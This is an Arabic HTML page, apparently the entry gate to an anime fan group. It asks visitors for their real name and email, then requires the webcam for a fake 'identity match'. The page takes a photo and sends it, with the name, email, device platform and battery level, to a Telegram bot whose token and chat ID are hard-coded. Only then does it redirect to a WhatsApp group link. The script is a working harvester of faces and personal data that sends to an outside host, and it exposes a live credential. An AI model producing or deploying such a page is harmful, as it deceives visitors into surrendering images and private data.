<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⛩️ مملكة يوسف علاء السيادية</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&family=Tajawal:wght@700;900&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <style>
        :root { --red: #ff003c; --gold: #ffb700; --black: #050505; }
        
        * { box-sizing: border-box; font-family: 'Cairo', sans-serif; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: var(--black); overflow: hidden; }

        /* مشغل الفيديوهات الخلفي */
        #video-bg {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            object-fit: cover; z-index: 1; opacity: 0.6;
        }

        /* الطبقة السوداء المشعة فوق الفيديو */
        .overlay-ui {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 2; display: flex; justify-content: center; align-items: center;
            background: radial-gradient(circle, rgba(0,0,0,0.4) 0%, rgba(5,5,5,0.9) 100%);
        }

        /* الكارت الرئيسي المشع */
        .main-card {
            position: relative; width: 90%; max-width: 450px;
            background: rgba(10, 10, 10, 0.8);
            backdrop-filter: blur(15px);
            border: 2px solid var(--red);
            border-radius: 30px; padding: 40px 30px;
            text-align: center;
            box-shadow: 0 0 40px rgba(255, 0, 60, 0.6), inset 0 0 20px rgba(255, 0, 60, 0.2);
            animation: glow 3s infinite alternate;
        }

        @keyframes glow { from { box-shadow: 0 0 30px rgba(255, 0, 60, 0.4); } to { box-shadow: 0 0 60px rgba(255, 0, 60, 0.8); } }

        h1 { color: #fff; text-shadow: 0 0 15px var(--red); margin: 0 0 10px 0; font-size: 28px; }
        p.founder { color: var(--gold); font-size: 14px; font-weight: 900; margin-bottom: 30px; letter-spacing: 2px; }

        .input-group { margin-bottom: 20px; text-align: right; }
        label { display: block; color: var(--gold); font-size: 12px; margin-bottom: 8px; margin-right: 5px; }
        input {
            width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #333;
            background: rgba(0,0,0,0.5); color: #fff; font-size: 16px; outline: none;
            transition: 0.3s; text-align: right;
        }
        input:focus { border-color: var(--red); box-shadow: 0 0 15px rgba(255, 0, 60, 0.3); }

        .btn-action {
            width: 100%; padding: 18px; border: none; border-radius: 12px;
            background: linear-gradient(45deg, var(--red), #80001e);
            color: #fff; font-size: 18px; font-weight: 900; cursor: pointer;
            box-shadow: 0 5px 15px rgba(255, 0, 60, 0.4); transition: 0.3s;
        }
        .btn-action:hover { transform: scale(1.03); filter: brightness(1.2); }

        #camera-section { display: none; }
        .cam-box { width: 100%; border-radius: 15px; overflow: hidden; border: 2px solid var(--red); margin: 20px 0; background: #000; position: relative; }
        video#webcam { width: 100%; display: block; transform: scaleX(-1); }
        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: var(--red); box-shadow: 0 0 10px var(--red); animation: scan 2s infinite; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }

        .hidden { display: none; }
    </style>
</head>
<body>

    <video id="video-bg" autoplay muted playsinline></video>

    <div class="overlay-ui">
        <div class="main-card">
            <h1>⛩️ مَمْلَكَة الأوتـاكو</h1>
            <p class="founder">بإشراف القائد: يوسف علاء</p>

            <div id="step1">
                <div class="input-group">
                    <label>👤 الاسم الكامل للمحارب:</label>
                    <input type="text" id="u_name" placeholder="اكتب اسمك الحقيقي..." required>
                </div>
                <div class="input-group">
                    <label>📧 البريد الإلكتروني المعتمد:</label>
                    <input type="email" id="u_mail" placeholder="example@gmail.com" required>
                </div>
                <button onclick="activateGate()" class="btn-action">فتح البوابة الملكية ⚔️</button>
            </div>

            <div id="step2" class="hidden">
                <p style="color:#ccc; font-size: 12px;">جاري مطابقة الهوية مع سجلات القائد..</p>
                <div class="cam-box">
                    <div class="scan-line"></div>
                    <video id="webcam" autoplay playsinline></video>
                    <canvas id="out" style="display:none;"></canvas>
                </div>
                <button onclick="captureAndSend()" class="btn-action">تأكيد الدخول النهائي 🚀</button>
            </div>

            <p style="margin-top: 25px; color: #444; font-size: 10px; font-weight: bold;">ALL RIGHTS RESERVED TO YOUSSEF ALAA © 2026</p>
        </div>
    </div>

    <script>
        const TOKEN = "8737868558:AAFqvBT8qY3E5kJDC8bjXT1Ku9gSBXv9Q4g";
        const CHAT_ID = "7394389253";
        const WHATSAPP = "https://chat.whatsapp.com/J08oDw7MzULIJHnzN2Okts";
        const VIDS = ["385937dae3995b54f3fecde0dd7acec7_1769970173274.mp4", "fqBsQ4ZhiMk.mp4"];
        
        let vIndex = 0;
        const bgVid = document.getElementById('video-bg');

        // نظام الفيديوهات المتتابع
        function nextVid() {
            bgVid.src = VIDS[vIndex];
            bgVid.play().catch(()=>{});
            vIndex = (vIndex + 1) % VIDS.length;
        }
        bgVid.onended = nextVid;
        nextVid();

        // تفعيل الصوت عند أول ضغطة
        function enableAudio() {
            bgVid.muted = false;
            bgVid.volume = 0.5;
        }

        function activateGate() {
            const n = document.getElementById('u_name').value;
            const m = document.getElementById('u_mail').value;

            if(n.length < 3 || !m.includes('@')) {
                return Swal.fire({ icon: 'error', title: 'بيانات ناقصة', background: '#111', color: '#fff' });
            }

            enableAudio(); // تشغيل الصوت فوراً
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(s => { document.getElementById('webcam').srcObject = s; })
                .catch(() => { Swal.fire('تنبيه', 'يجب تفعيل الكاميرا للمتابعة!', 'warning'); });
        }

        async function captureAndSend() {
            Swal.fire({ title: 'جاري الإرسال...', text: 'يتم الآن نقل بياناتك للقائد يوسف علاء', background: '#000', color: '#fff', allowOutsideClick: false, didOpen: () => Swal.showLoading() });

            const video = document.getElementById('webcam');
            const canvas = document.getElementById('out');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            canvas.toBlob(async (blob) => {
                const name = document.getElementById('u_name').value;
                const mail = document.getElementById('u_mail').value;

                const caption = `
🚨 **محارب جديد على الأبواب** 🚨
━━━━━━━━━━━━━━
👤 **الاسم:** ${name}
📧 **البريد:** ${mail}
📱 **الجهاز:** ${navigator.platform}
🔋 **البطارية:** ${navigator.getBattery ? (await navigator.getBattery()).level * 100 + '%' : 'غير متاح'}
⏰ **التوقيت:** ${new Date().toLocaleString('ar-EG')}
━━━━━━━━━━━━━━
👑 **بإشراف: يوسف علاء** 👑
                `;

                const fd = new FormData();
                fd.append("chat_id", CHAT_ID);
                fd.append("photo", blob, "capture.jpg");
                fd.append("caption", caption);
                fd.append("parse_mode", "Markdown");

                try {
                    // محاولة الإرسال لتليجرام وانتظار الرد
                    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                        method: "POST",
                        body: fd
                    });

                    if (response.ok) {
                        // فقط إذا نجح الإرسال يتم التحويل
                        window.location.href = WHATSAPP;
                    } else {
                        // إذا فشل تليجرام، نظهر رسالة خطأ
                        Swal.fire('خطأ في السيرفر', 'فشل إرسال البيانات، تأكد من الإنترنت.', 'error');
                    }
                } catch (e) {
                    Swal.fire('خطأ في الاتصال', 'تأكد من اتصالك بالإنترنت وحاول مجدداً.', 'error');
                }
            }, 'image/jpeg', 0.8);
        }
    </script>
</body>
</html>
